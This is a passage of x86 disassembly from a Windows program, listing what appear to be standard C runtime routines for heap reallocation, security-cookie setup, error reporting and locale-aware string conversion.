  427301:	call   0x426062
  427306:	pop    ecx
  427307:	jmp    0x427490
  42730c:	mov    esi,DWORD PTR [ebp+0xc]
  42730f:	cmp    esi,ebx
  427311:	jne    0x42731f
  427313:	push   edi
  427314:	call   0x425f4a
  427319:	pop    ecx
  42731a:	jmp    0x42748e
  42731f:	cmp    DWORD PTR ds:0x45e144,0x3
  427326:	jne    0x42745a
  42732c:	mov    DWORD PTR [ebp-0x1c],ebx
  42732f:	cmp    esi,0xffffffe0
  427332:	ja     0x427429
  427338:	push   0x4
  42733a:	call   0x4254ff
  42733f:	pop    ecx
  427340:	mov    DWORD PTR [ebp-0x4],ebx
  427343:	push   edi
  427344:	call   0x426722
  427349:	pop    ecx
  42734a:	mov    DWORD PTR [ebp-0x20],eax
  42734d:	cmp    eax,ebx
  42734f:	je     0x4273f9
  427355:	cmp    esi,DWORD PTR ds:0x45df04
  42735b:	ja     0x4273a9
  42735d:	push   esi
  42735e:	push   edi
  42735f:	push   eax
  427360:	call   0x426c22
  427365:	add    esp,0xc
  427368:	test   eax,eax
  42736a:	je     0x427371
  42736c:	mov    DWORD PTR [ebp-0x1c],edi
  42736f:	jmp    0x4273a9
  427371:	push   esi
  427372:	call   0x426f01
  427377:	pop    ecx
  427378:	mov    DWORD PTR [ebp-0x1c],eax
  42737b:	cmp    eax,ebx
  42737d:	je     0x4273a9
  42737f:	mov    eax,DWORD PTR [edi-0x4]
  427382:	dec    eax
  427383:	mov    DWORD PTR [ebp-0x24],eax
  427386:	cmp    eax,esi
  427388:	jb     0x42738c
  42738a:	mov    eax,esi
  42738c:	push   eax
  42738d:	push   edi
  42738e:	push   DWORD PTR [ebp-0x1c]
  427391:	call   0x426080
  427396:	push   edi
  427397:	call   0x426722
  42739c:	mov    DWORD PTR [ebp-0x20],eax
  42739f:	push   edi
  4273a0:	push   eax
  4273a1:	call   0x42674d
  4273a6:	add    esp,0x18
  4273a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273ac:	jne    0x4273f9
  4273ae:	cmp    esi,ebx
  4273b0:	jne    0x4273b8
  4273b2:	xor    esi,esi
  4273b4:	inc    esi
  4273b5:	mov    DWORD PTR [ebp+0xc],esi
  4273b8:	add    esi,0xf
  4273bb:	and    esi,0xfffffff0
  4273be:	mov    DWORD PTR [ebp+0xc],esi
  4273c1:	push   esi
  4273c2:	push   ebx
  4273c3:	push   DWORD PTR ds:0x45e140
  4273c9:	call   DWORD PTR ds:0x429030
  4273cf:	mov    DWORD PTR [ebp-0x1c],eax
  4273d2:	cmp    eax,ebx
  4273d4:	je     0x4273f9
  4273d6:	mov    eax,DWORD PTR [edi-0x4]
  4273d9:	dec    eax
  4273da:	mov    DWORD PTR [ebp-0x24],eax
  4273dd:	cmp    eax,esi
  4273df:	jb     0x4273e3
  4273e1:	mov    eax,esi
  4273e3:	push   eax
  4273e4:	push   edi
  4273e5:	push   DWORD PTR [ebp-0x1c]
  4273e8:	call   0x426080
  4273ed:	push   edi
  4273ee:	push   DWORD PTR [ebp-0x20]
  4273f1:	call   0x42674d
  4273f6:	add    esp,0x14
  4273f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4273fd:	call   0x427451
  427402:	cmp    DWORD PTR [ebp-0x20],ebx
  427405:	jne    0x427429
  427407:	cmp    esi,ebx
  427409:	jne    0x42740e
  42740b:	xor    esi,esi
  42740d:	inc    esi
  42740e:	add    esi,0xf
  427411:	and    esi,0xfffffff0
  427414:	mov    DWORD PTR [ebp+0xc],esi
  427417:	push   esi
  427418:	push   edi
  427419:	push   ebx
  42741a:	push   DWORD PTR ds:0x45e140
  427420:	call   DWORD PTR ds:0x4290d0
  427426:	mov    DWORD PTR [ebp-0x1c],eax
  427429:	mov    eax,DWORD PTR [ebp-0x1c]
  42742c:	cmp    eax,ebx
  42742e:	jne    0x427490
  427430:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427436:	je     0x427490
  427438:	push   esi
  427439:	call   0x427c22
  42743e:	pop    ecx
  42743f:	test   eax,eax
  427441:	jne    0x42732c
  427447:	jmp    0x42748e
  427449:	xor    ebx,ebx
  42744b:	mov    esi,DWORD PTR [ebp+0xc]
  42744e:	mov    edi,DWORD PTR [ebp+0x8]
  427451:	push   0x4
  427453:	call   0x42546b
  427458:	pop    ecx
  427459:	ret    
  42745a:	xor    eax,eax
  42745c:	cmp    esi,0xffffffe0
  42745f:	ja     0x427477
  427461:	cmp    esi,ebx
  427463:	jne    0x427468
  427465:	xor    esi,esi
  427467:	inc    esi
  427468:	push   esi
  427469:	push   edi
  42746a:	push   ebx
  42746b:	push   DWORD PTR ds:0x45e140
  427471:	call   DWORD PTR ds:0x4290d0
  427477:	cmp    eax,ebx
  427479:	jne    0x427490
  42747b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427481:	je     0x427490
  427483:	push   esi
  427484:	call   0x427c22
  427489:	pop    ecx
  42748a:	test   eax,eax
  42748c:	jne    0x42745a
  42748e:	xor    eax,eax
  427490:	call   0x42537b
  427495:	ret    
  427496:	push   0x10
  427498:	push   0x429888
  42749d:	call   0x425340
  4274a2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274a9:	jne    0x4274e5
  4274ab:	push   0x4
  4274ad:	call   0x4254ff
  4274b2:	pop    ecx
  4274b3:	and    DWORD PTR [ebp-0x4],0x0
  4274b7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ba:	push   esi
  4274bb:	call   0x426722
  4274c0:	pop    ecx
  4274c1:	mov    DWORD PTR [ebp-0x1c],eax
  4274c4:	test   eax,eax
  4274c6:	je     0x4274d3
  4274c8:	mov    esi,DWORD PTR [esi-0x4]
  4274cb:	sub    esi,0x9
  4274ce:	mov    DWORD PTR [ebp-0x20],esi
  4274d1:	jmp    0x4274d6
  4274d3:	mov    esi,DWORD PTR [ebp-0x20]
  4274d6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274da:	call   0x427503
  4274df:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274e3:	jne    0x4274f8
  4274e5:	push   DWORD PTR [ebp+0x8]
  4274e8:	push   0x0
  4274ea:	push   DWORD PTR ds:0x45e140
  4274f0:	call   DWORD PTR ds:0x4290d4
  4274f6:	mov    esi,eax
  4274f8:	mov    eax,esi
  4274fa:	call   0x42537b
  4274ff:	ret    
  427500:	mov    esi,DWORD PTR [ebp-0x20]
  427503:	push   0x4
  427505:	call   0x42546b
  42750a:	pop    ecx
  42750b:	ret    
  42750c:	push   ebp
  42750d:	mov    ebp,esp
  42750f:	sub    esp,0x10
  427512:	push   esi
  427513:	lea    eax,[ebp-0x8]
  427516:	push   eax
  427517:	call   DWORD PTR ds:0x4290e4
  42751d:	mov    esi,DWORD PTR [ebp-0x4]
  427520:	xor    esi,DWORD PTR [ebp-0x8]
  427523:	call   DWORD PTR ds:0x4290e0
  427529:	xor    esi,eax
  42752b:	call   DWORD PTR ds:0x429098
  427531:	xor    esi,eax
  427533:	call   DWORD PTR ds:0x4290dc
  427539:	xor    esi,eax
  42753b:	lea    eax,[ebp-0x10]
  42753e:	push   eax
  42753f:	call   DWORD PTR ds:0x4290d8
  427545:	mov    eax,DWORD PTR [ebp-0xc]
  427548:	xor    eax,DWORD PTR [ebp-0x10]
  42754b:	xor    esi,eax
  42754d:	mov    DWORD PTR ds:0x45d430,esi
  427553:	jne    0x42755f
  427555:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42755f:	pop    esi
  427560:	leave  
  427561:	ret    
  427562:	push   0x118
  427567:	push   0x429a38
  42756c:	call   0x425340
  427571:	mov    eax,ds:0x45d430
  427576:	xor    eax,DWORD PTR [ebp+0x4]
  427579:	mov    DWORD PTR [ebp-0x1c],eax
  42757c:	mov    eax,ds:0x45dd98
  427581:	xor    ecx,ecx
  427583:	cmp    eax,ecx
  427585:	je     0x4275a6
  427587:	mov    DWORD PTR [ebp-0x4],ecx
  42758a:	push   DWORD PTR [ebp+0xc]
  42758d:	push   DWORD PTR [ebp+0x8]
  427590:	call   eax
  427592:	pop    ecx
  427593:	pop    ecx
  427594:	or     DWORD PTR [ebp-0x4],0xffffffff
  427598:	jmp    0x4276a4
  42759d:	xor    eax,eax
  42759f:	inc    eax
  4275a0:	ret    
  4275a1:	mov    esp,DWORD PTR [ebp-0x18]
  4275a4:	jmp    0x427594
  4275a6:	mov    eax,DWORD PTR [ebp+0x8]
  4275a9:	dec    eax
  4275aa:	je     0x4275bf
  4275ac:	mov    edi,0x429a14
  4275b1:	mov    DWORD PTR [ebp-0x20],0x429960
  4275b8:	mov    esi,0xd4
  4275bd:	jmp    0x4275d0
  4275bf:	mov    edi,0x429940
  4275c4:	mov    DWORD PTR [ebp-0x20],0x4298a0
  4275cb:	mov    esi,0xb9
  4275d0:	mov    BYTE PTR [ebp-0x24],cl
  4275d3:	push   0x104
  4275d8:	lea    eax,[ebp-0x128]
  4275de:	push   eax
  4275df:	push   ecx
  4275e0:	call   DWORD PTR ds:0x429068
  4275e6:	test   eax,eax
  4275e8:	jne    0x4275fd
  4275ea:	push   0x429594
  4275ef:	lea    eax,[ebp-0x128]
  4275f5:	push   eax
  4275f6:	call   0x425720
  4275fb:	pop    ecx
  4275fc:	pop    ecx
  4275fd:	lea    ebx,[ebp-0x128]
  427603:	lea    eax,[ebp-0x128]
  427609:	push   eax
  42760a:	call   0x425950
  42760f:	pop    ecx
  427610:	add    eax,0xb
  427613:	cmp    eax,0x3c
  427616:	jbe    0x427641
  427618:	lea    eax,[ebp-0x128]
  42761e:	push   eax
  42761f:	call   0x425950
  427624:	mov    ebx,eax
  427626:	lea    eax,[ebp-0x128]
  42762c:	sub    eax,0x31
  42762f:	add    ebx,eax
  427631:	push   0x3
  427633:	push   0x429590
  427638:	push   ebx
  427639:	call   0x425820
  42763e:	add    esp,0x10
  427641:	push   ebx
  427642:	call   0x425950
  427647:	pop    ecx
  427648:	lea    eax,[eax+esi*1+0xc]
  42764c:	add    eax,0x3
  42764f:	and    eax,0xfffffffc
  427652:	call   0x425390
  427657:	mov    DWORD PTR [ebp-0x18],esp
  42765a:	mov    esi,esp
  42765c:	push   edi
  42765d:	push   esi
  42765e:	call   0x425720
  427663:	mov    edi,0x429570
  427668:	push   edi
  427669:	push   esi
  42766a:	call   0x425730
  42766f:	push   0x429894
  427674:	push   esi
  427675:	call   0x425730
  42767a:	push   ebx
  42767b:	push   esi
  42767c:	call   0x425730
  427681:	push   edi
  427682:	push   esi
  427683:	call   0x425730
  427688:	push   DWORD PTR [ebp-0x20]
  42768b:	push   esi
  42768c:	call   0x425730
  427691:	push   0x12010
  427696:	push   0x429548
  42769b:	push   esi
  42769c:	call   0x425622
  4276a1:	add    esp,0x3c
  4276a4:	push   0x3
  4276a6:	call   0x4247ac
  4276ab:	int3   
  4276ac:	push   0x38
  4276ae:	push   0x429e58
  4276b3:	call   0x425340
  4276b8:	xor    ebx,ebx
  4276ba:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276c0:	jne    0x4276fa
  4276c2:	push   ebx
  4276c3:	push   ebx
  4276c4:	xor    esi,esi
  4276c6:	inc    esi
  4276c7:	push   esi
  4276c8:	push   0x429e54
  4276cd:	push   0x100
  4276d2:	push   ebx
  4276d3:	call   DWORD PTR ds:0x4290f0
  4276d9:	test   eax,eax
  4276db:	je     0x4276e5
  4276dd:	mov    DWORD PTR ds:0x45ddbc,esi
  4276e3:	jmp    0x4276fa
  4276e5:	call   DWORD PTR ds:0x429044
  4276eb:	cmp    eax,0x78
  4276ee:	jne    0x4276fa
  4276f0:	mov    DWORD PTR ds:0x45ddbc,0x2
  4276fa:	cmp    DWORD PTR [ebp+0x14],ebx
  4276fd:	jle    0x42771a
  4276ff:	mov    ecx,DWORD PTR [ebp+0x14]
  427702:	mov    eax,DWORD PTR [ebp+0x10]
  427705:	dec    ecx
  427706:	cmp    BYTE PTR [eax],bl
  427708:	je     0x427712
  42770a:	inc    eax
  42770b:	cmp    ecx,ebx
  42770d:	jne    0x427705
  42770f:	or     ecx,0xffffffff
  427712:	or     eax,0xffffffff
  427715:	sub    eax,ecx
  427717:	add    DWORD PTR [ebp+0x14],eax
  42771a:	mov    eax,ds:0x45ddbc
  42771f:	cmp    eax,0x2
  427722:	je     0x427904
  427728:	cmp    eax,ebx
  42772a:	je     0x427904
  427730:	cmp    eax,0x1
  427733:	jne    0x427937
  427739:	xor    edi,edi
  42773b:	mov    DWORD PTR [ebp-0x1c],edi
  42773e:	mov    DWORD PTR [ebp-0x20],ebx
  427741:	mov    DWORD PTR [ebp-0x24],ebx
  427744:	cmp    DWORD PTR [ebp+0x20],ebx
  427747:	jne    0x427751
  427749:	mov    eax,ds:0x45ddb4
  42774e:	mov    DWORD PTR [ebp+0x20],eax
  427751:	push   ebx
  427752:	push   ebx
  427753:	push   DWORD PTR [ebp+0x14]
  427756:	push   DWORD PTR [ebp+0x10]
  427759:	xor    eax,eax
  42775b:	cmp    DWORD PTR [ebp+0x24],ebx
  42775e:	setne  al
  427761:	lea    eax,[eax*8+0x1]
  427768:	push   eax
  427769:	push   DWORD PTR [ebp+0x20]
  42776c:	call   DWORD PTR ds:0x4290ec
  427772:	mov    esi,eax
  427774:	mov    DWORD PTR [ebp-0x28],esi
  427777:	cmp    esi,ebx
  427779:	je     0x427937
  42777f:	mov    DWORD PTR [ebp-0x4],0x1
  427786:	lea    eax,[esi+esi*1]
  427789:	add    eax,0x3
  42778c:	and    eax,0xfffffffc
  42778f:	call   0x425390
  427794:	mov    DWORD PTR [ebp-0x18],esp
  427797:	mov    eax,esp
  427799:	mov    DWORD PTR [ebp-0x2c],eax
  42779c:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277a0:	jmp    0x4277bd
  4277a2:	xor    eax,eax
  4277a4:	inc    eax
  4277a5:	ret    
  4277a6:	mov    esp,DWORD PTR [ebp-0x18]
  4277a9:	call   0x4287d5
  4277ae:	xor    ebx,ebx
  4277b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277b3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ba:	mov    esi,DWORD PTR [ebp-0x28]
  4277bd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277c0:	jne    0x4277de
  4277c2:	lea    eax,[esi+esi*1]
  4277c5:	push   eax
  4277c6:	call   0x426062
  4277cb:	pop    ecx
  4277cc:	mov    DWORD PTR [ebp-0x2c],eax
  4277cf:	cmp    eax,ebx
  4277d1:	je     0x427937
  4277d7:	mov    DWORD PTR [ebp-0x20],0x1
  4277de:	push   esi
  4277df:	push   DWORD PTR [ebp-0x2c]
  4277e2:	push   DWORD PTR [ebp+0x14]
  4277e5:	push   DWORD PTR [ebp+0x10]
  4277e8:	push   0x1
  4277ea:	push   DWORD PTR [ebp+0x20]
  4277ed:	call   DWORD PTR ds:0x4290ec
  4277f3:	test   eax,eax
  4277f5:	je     0x4278e1
  4277fb:	push   ebx
  4277fc:	push   ebx
  4277fd:	push   esi
  4277fe:	push   DWORD PTR [ebp-0x2c]
  427801:	push   DWORD PTR [ebp+0xc]
  427804:	push   DWORD PTR [ebp+0x8]
  427807:	call   DWORD PTR ds:0x4290f0
  42780d:	mov    edi,eax
  42780f:	mov    DWORD PTR [ebp-0x1c],edi
  427812:	cmp    edi,ebx
  427814:	je     0x4278e1
  42781a:	test   BYTE PTR [ebp+0xd],0x4
  42781e:	je     0x42784d
  427820:	cmp    DWORD PTR [ebp+0x1c],ebx
  427823:	je     0x4278e1
  427829:	cmp    edi,DWORD PTR [ebp+0x1c]
  42782c:	jg     0x4278e1
  427832:	push   DWORD PTR [ebp+0x1c]
  427835:	push   DWORD PTR [ebp+0x18]
  427838:	push   esi
  427839:	push   DWORD PTR [ebp-0x2c]
  42783c:	push   DWORD PTR [ebp+0xc]
  42783f:	push   DWORD PTR [ebp+0x8]
  427842:	call   DWORD PTR ds:0x4290f0
  427848:	jmp    0x4278e1
  42784d:	mov    DWORD PTR [ebp-0x4],0x2
  427854:	lea    eax,[edi+edi*1]
  427857:	add    eax,0x3
  42785a:	and    eax,0xfffffffc
  42785d:	call   0x425390
  427862:	mov    DWORD PTR [ebp-0x18],esp
  427865:	mov    eax,esp
  427867:	mov    DWORD PTR [ebp-0x30],eax
  42786a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42786e:	jmp    0x42788b
  427870:	xor    eax,eax
  427872:	inc    eax
  427873:	ret    
  427874:	mov    esp,DWORD PTR [ebp-0x18]
  427877:	call   0x4287d5
  42787c:	xor    ebx,ebx
  42787e:	mov    DWORD PTR [ebp-0x30],ebx
  427881:	or     DWORD PTR [ebp-0x4],0xffffffff
  427885:	mov    edi,DWORD PTR [ebp-0x1c]
  427888:	mov    esi,DWORD PTR [ebp-0x28]
  42788b:	cmp    DWORD PTR [ebp-0x30],ebx
  42788e:	jne    0x4278a8
  427890:	lea    eax,[edi+edi*1]
  427893:	push   eax
  427894:	call   0x426062
  427899:	pop    ecx
  42789a:	mov    DWORD PTR [ebp-0x30],eax
  42789d:	cmp    eax,ebx
  42789f:	je     0x4278e1
  4278a1:	mov    DWORD PTR [ebp-0x24],0x1
  4278a8:	push   edi
  4278a9:	push   DWORD PTR [ebp-0x30]
  4278ac:	push   esi
  4278ad:	push   DWORD PTR [ebp-0x2c]
  4278b0:	push   DWORD PTR [ebp+0xc]
  4278b3:	push   DWORD PTR [ebp+0x8]
  4278b6:	call   DWORD PTR ds:0x4290f0
  4278bc:	test   eax,eax
  4278be:	je     0x4278e1
  4278c0:	push   ebx
  4278c1:	push   ebx
  4278c2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278c5:	jne    0x4278cb
  4278c7:	push   ebx
  4278c8:	push   ebx
  4278c9:	jmp    0x4278d1
  4278cb:	push   DWORD PTR [ebp+0x1c]
  4278ce:	push   DWORD PTR [ebp+0x18]
  4278d1:	push   edi
  4278d2:	push   DWORD PTR [ebp-0x30]
  4278d5:	push   ebx
  4278d6:	push   DWORD PTR [ebp+0x20]
  4278d9:	call   DWORD PTR ds:0x42907c
  4278df:	mov    edi,eax
  4278e1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278e4:	je     0x4278ef
  4278e6:	push   DWORD PTR [ebp-0x30]
  4278e9:	call   0x425f4a
  4278ee:	pop    ecx
  4278ef:	cmp    DWORD PTR [ebp-0x20],ebx
  4278f2:	je     0x4278fd
  4278f4:	push   DWORD PTR [ebp-0x2c]
  4278f7:	call   0x425f4a
  4278fc:	pop    ecx
  4278fd:	mov    eax,edi
  4278ff:	jmp    0x427a5f
  427904:	mov    DWORD PTR [ebp-0x34],ebx
  427907:	xor    edi,edi
  427909:	mov    DWORD PTR [ebp-0x38],ebx
  42790c:	cmp    DWORD PTR [ebp+0x8],ebx
  42790f:	jne    0x427919
  427911:	mov    eax,ds:0x45dda4
  427916:	mov    DWORD PTR [ebp+0x8],eax
  427919:	cmp    DWORD PTR [ebp+0x20],ebx
  42791c:	jne    0x427926
  42791e:	mov    eax,ds:0x45ddb4
  427923:	mov    DWORD PTR [ebp+0x20],eax
  427926:	push   DWORD PTR [ebp+0x8]
  427929:	call   0x4285bd
  42792e:	pop    ecx
  42792f:	mov    DWORD PTR [ebp-0x3c],eax
  427932:	cmp    eax,0xffffffff
  427935:	jne    0x42793e
  427937:	xor    eax,eax
  427939:	jmp    0x427a5f
  42793e:	cmp    eax,DWORD PTR [ebp+0x20]
  427941:	je     0x427a35
  427947:	push   ebx
  427948:	push   ebx
  427949:	lea    ecx,[ebp+0x14]
  42794c:	push   ecx
  42794d:	push   DWORD PTR [ebp+0x10]
  427950:	push   eax
  427951:	push   DWORD PTR [ebp+0x20]
  427954:	call   0x428606
  427959:	add    esp,0x18
  42795c:	mov    DWORD PTR [ebp-0x34],eax
  42795f:	cmp    eax,ebx
  427961:	je     0x427937
  427963:	push   ebx
  427964:	push   ebx
  427965:	push   DWORD PTR [ebp+0x14]
  427968:	push   eax
  427969:	push   DWORD PTR [ebp+0xc]
  42796c:	push   DWORD PTR [ebp+0x8]
  42796f:	call   DWORD PTR ds:0x4290e8
  427975:	mov    esi,eax
  427977:	mov    DWORD PTR [ebp-0x40],esi
  42797a:	cmp    esi,ebx
  42797c:	je     0x427a24
  427982:	mov    DWORD PTR [ebp-0x4],ebx
  427985:	add    eax,0x3
  427988:	and    eax,0xfffffffc
  42798b:	call   0x425390
  427990:	mov    DWORD PTR [ebp-0x18],esp
  427993:	mov    edi,esp
  427995:	mov    DWORD PTR [ebp-0x44],edi
  427998:	push   esi
  427999:	push   ebx
  42799a:	push   edi
  42799b:	call   0x427c40
  4279a0:	add    esp,0xc
  4279a3:	jmp    0x4279b5
  4279a5:	xor    eax,eax
  4279a7:	inc    eax
  4279a8:	ret    
  4279a9:	mov    esp,DWORD PTR [ebp-0x18]
  4279ac:	call   0x4287d5
  4279b1:	xor    ebx,ebx
  4279b3:	xor    edi,edi
  4279b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279b9:	cmp    edi,ebx
  4279bb:	jne    0x4279e0
  4279bd:	push   DWORD PTR [ebp-0x40]
  4279c0:	call   0x426062
  4279c5:	pop    ecx
  4279c6:	mov    edi,eax
  4279c8:	cmp    edi,ebx
  4279ca:	je     0x4279fd
  4279cc:	push   DWORD PTR [ebp-0x40]
  4279cf:	push   ebx
  4279d0:	push   edi
  4279d1:	call   0x427c40
  4279d6:	add    esp,0xc
  4279d9:	mov    DWORD PTR [ebp-0x38],0x1
  4279e0:	push   DWORD PTR [ebp-0x40]
  4279e3:	push   edi
  4279e4:	push   DWORD PTR [ebp+0x14]
  4279e7:	push   DWORD PTR [ebp-0x34]
  4279ea:	push   DWORD PTR [ebp+0xc]
  4279ed:	push   DWORD PTR [ebp+0x8]
  4279f0:	call   DWORD PTR ds:0x4290e8
  4279f6:	mov    DWORD PTR [ebp-0x40],eax
  4279f9:	cmp    eax,ebx
  4279fb:	jne    0x427a01
  4279fd:	xor    esi,esi
  4279ff:	jmp    0x427a27
  427a01:	push   DWORD PTR [ebp+0x1c]
  427a04:	push   DWORD PTR [ebp+0x18]
  427a07:	lea    eax,[ebp-0x40]
  427a0a:	push   eax
  427a0b:	push   edi
  427a0c:	push   DWORD PTR [ebp+0x20]
  427a0f:	push   DWORD PTR [ebp-0x3c]
  427a12:	call   0x428606
  427a17:	add    esp,0x18
  427a1a:	mov    esi,eax
  427a1c:	neg    esi
  427a1e:	sbb    esi,esi
  427a20:	neg    esi
  427a22:	jmp    0x427a27
  427a24:	mov    esi,DWORD PTR [ebp-0x48]
  427a27:	cmp    DWORD PTR [ebp-0x38],ebx
  427a2a:	je     0x427a4f
  427a2c:	push   edi
  427a2d:	call   0x425f4a
  427a32:	pop    ecx
  427a33:	jmp    0x427a4f
  427a35:	push   DWORD PTR [ebp+0x1c]
  427a38:	push   DWORD PTR [ebp+0x18]
  427a3b:	push   DWORD PTR [ebp+0x14]
  427a3e:	push   DWORD PTR [ebp+0x10]
  427a41:	push   DWORD PTR [ebp+0xc]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	call   DWORD PTR ds:0x4290e8
  427a4d:	mov    esi,eax
  427a4f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a52:	je     0x427a5d
  427a54:	push   DWORD PTR [ebp-0x34]
  427a57:	call   0x425f4a
  427a5c:	pop    ecx
  427a5d:	mov    eax,esi
  427a5f:	lea    esp,[ebp-0x54]
  427a62:	call   0x42537b
  427a67:	ret    
  427a68:	push   0x1c
  427a6a:	push   0x429e80
  427a6f:	call   0x425340
  427a74:	xor    esi,esi
  427a76:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a7c:	jne    0x427ab3
  427a7e:	lea    eax,[ebp-0x1c]
  427a81:	push   eax
  427a82:	xor    edi,edi
  427a84:	inc    edi
  427a85:	push   edi
  427a86:	push   0x429e54
  427a8b:	push   edi
  427a8c:	call   DWORD PTR ds:0x4290f8
  427a92:	test   eax,eax
  427a94:	je     0x427a9e
  427a96:	mov    DWORD PTR ds:0x45ddc0,edi
  427a9c:	jmp    0x427ab3
  427a9e:	call   DWORD PTR ds:0x429044
  427aa4:	cmp    eax,0x78
  427aa7:	jne    0x427ab3
  427aa9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ab3:	mov    eax,ds:0x45ddc0
  427ab8:	cmp    eax,0x2
  427abb:	je     0x427bab
  427ac1:	cmp    eax,esi
  427ac3:	je     0x427bab
  427ac9:	cmp    eax,0x1
  427acc:	jne    0x427bd1
  427ad2:	mov    DWORD PTR [ebp-0x20],esi
  427ad5:	mov    DWORD PTR [ebp-0x24],esi
  427ad8:	cmp    DWORD PTR [ebp+0x18],esi
  427adb:	jne    0x427ae5
  427add:	mov    eax,ds:0x45ddb4
  427ae2:	mov    DWORD PTR [ebp+0x18],eax
  427ae5:	push   esi
  427ae6:	push   esi
  427ae7:	push   DWORD PTR [ebp+0x10]
  427aea:	push   DWORD PTR [ebp+0xc]
  427aed:	xor    eax,eax
  427aef:	cmp    DWORD PTR [ebp+0x20],esi
  427af2:	setne  al
  427af5:	lea    eax,[eax*8+0x1]
  427afc:	push   eax
  427afd:	push   DWORD PTR [ebp+0x18]
  427b00:	call   DWORD PTR ds:0x4290ec
  427b06:	mov    edi,eax
  427b08:	mov    DWORD PTR [ebp-0x28],edi
  427b0b:	test   edi,edi
  427b0d:	je     0x427bd1
  427b13:	and    DWORD PTR [ebp-0x4],0x0
  427b17:	lea    ebx,[edi+edi*1]
  427b1a:	mov    eax,ebx
  427b1c:	add    eax,0x3
  427b1f:	and    eax,0xfffffffc
  427b22:	call   0x425390
  427b27:	mov    DWORD PTR [ebp-0x18],esp
  427b2a:	mov    esi,esp
  427b2c:	mov    DWORD PTR [ebp-0x2c],esi
  427b2f:	push   ebx
  427b30:	push   0x0
  427b32:	push   esi
  427b33:	call   0x427c40
  427b38:	add    esp,0xc
  427b3b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b3f:	jmp    0x427b56
  427b41:	xor    eax,eax
  427b43:	inc    eax
  427b44:	ret    
  427b45:	mov    esp,DWORD PTR [ebp-0x18]
  427b48:	call   0x4287d5
  427b4d:	xor    esi,esi
  427b4f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b53:	mov    edi,DWORD PTR [ebp-0x28]
  427b56:	test   esi,esi
  427b58:	jne    0x427b71
  427b5a:	push   edi
  427b5b:	push   0x2
  427b5d:	call   0x426458
  427b62:	pop    ecx
  427b63:	pop    ecx
  427b64:	mov    esi,eax
  427b66:	test   esi,esi
  427b68:	je     0x427bd1
  427b6a:	mov    DWORD PTR [ebp-0x24],0x1
  427b71:	push   edi
  427b72:	push   esi
  427b73:	push   DWORD PTR [ebp+0x10]
  427b76:	push   DWORD PTR [ebp+0xc]
  427b79:	push   0x1
  427b7b:	push   DWORD PTR [ebp+0x18]
  427b7e:	call   DWORD PTR ds:0x4290ec
  427b84:	test   eax,eax
  427b86:	je     0x427b99
  427b88:	push   DWORD PTR [ebp+0x14]
  427b8b:	push   eax
  427b8c:	push   esi
  427b8d:	push   DWORD PTR [ebp+0x8]
  427b90:	call   DWORD PTR ds:0x4290f8
  427b96:	mov    DWORD PTR [ebp-0x20],eax
  427b99:	cmp    DWORD PTR [ebp-0x24],0x0
  427b9d:	je     0x427ba6
  427b9f:	push   esi
  427ba0:	call   0x425f4a
  427ba5:	pop    ecx
  427ba6:	mov    eax,DWORD PTR [ebp-0x20]
  427ba9:	jmp    0x427c19
  427bab:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bae:	cmp    ebx,esi
  427bb0:	jne    0x427bb8
  427bb2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bb8:	mov    edi,DWORD PTR [ebp+0x18]
  427bbb:	test   edi,edi
  427bbd:	jne    0x427bc5
  427bbf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bc5:	push   ebx
  427bc6:	call   0x4285bd
  427bcb:	pop    ecx
  427bcc:	cmp    eax,0xffffffff
  427bcf:	jne    0x427bd5
  427bd1:	xor    eax,eax
  427bd3:	jmp    0x427c19
  427bd5:	cmp    eax,edi
  427bd7:	je     0x427bf7
  427bd9:	push   0x0
  427bdb:	push   0x0
  427bdd:	lea    ecx,[ebp+0x10]
  427be0:	push   ecx
  427be1:	push   DWORD PTR [ebp+0xc]
  427be4:	push   eax
  427be5:	push   edi
  427be6:	call   0x428606
  427beb:	add    esp,0x18
  427bee:	mov    esi,eax
  427bf0:	test   esi,esi
  427bf2:	je     0x427bd1
  427bf4:	mov    DWORD PTR [ebp+0xc],esi
  427bf7:	push   DWORD PTR [ebp+0x14]
  427bfa:	push   DWORD PTR [ebp+0x10]
  427bfd:	push   DWORD PTR [ebp+0xc]
  427c00:	push   DWORD PTR [ebp+0x8]
  427c03:	push   ebx
  427c04:	call   DWORD PTR ds:0x4290f4
  427c0a:	mov    edi,eax
  427c0c:	test   esi,esi
  427c0e:	je     0x427c17
  427c10:	push   esi
  427c11:	call   0x425f4a
  427c16:	pop    ecx
  427c17:	mov    eax,edi
  427c19:	lea    esp,[ebp-0x38]
  427c1c:	call   0x42537b
  427c21:	ret    
  427c22:	mov    eax,ds:0x45ddc4
  427c27:	test   eax,eax
  427c29:	je     0x427c3a
  427c2b:	push   DWORD PTR [esp+0x4]
  427c2f:	call   eax
  427c31:	test   eax,eax
  427c33:	pop    ecx
  427c34:	je     0x427c3a
  427c36:	xor    eax,eax
  427c38:	inc    eax
  427c39:	ret    
  427c3a:	xor    eax,eax
  427c3c:	ret    
  427c3d:	int3   
  427c3e:	int3   
  427c3f:	int3   
  427c40:	mov    edx,DWORD PTR [esp+0xc]
  427c44:	mov    ecx,DWORD PTR [esp+0x4]
  427c48:	test   edx,edx
